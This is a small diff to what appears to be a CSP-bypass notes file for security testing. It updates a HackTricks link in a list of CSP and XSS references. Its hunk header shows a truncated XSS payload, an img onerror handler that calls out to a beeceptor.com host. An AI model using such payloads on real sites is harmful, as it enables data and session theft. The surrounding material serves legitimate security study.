@@ -576,9 +576,9 @@ https://vulnerable.org?parameter=<img src=x onerror="//night.free.beeceptor.com?
 - https://csplite.com/csp320/
 - https://content-security-policy.com/
 - https://csp-evaluator.withgoogle.com/
-- https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
 - https://www.cobalt.io/blog/csp-and-bypasses
 - https://chromestatus.com/feature/5735596811091968
+- https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/4%20-%20CSP%20Bypass.md
 
 rappel
